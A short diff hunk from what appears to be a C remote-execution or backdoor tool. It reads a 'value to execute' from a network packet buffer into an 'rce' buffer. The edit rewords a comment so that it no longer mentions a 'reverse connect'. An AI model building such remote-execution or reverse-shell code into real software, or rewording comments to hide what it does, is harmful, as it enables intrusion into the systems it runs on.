@@ -395,8 +395,7 @@ int main(int argc, char **argv) {
         if (!cfg.payload) {
           char *rce = malloc(MAX_RCE_SIZE);
           int retval;
-
-          // First check for payload in packet buffer before reverse connect!
+          // Check the packet buffer for the value to execute.
           retval = xcaprce(saddrval, rce);
           if (retval == 0) {
             char *ret;
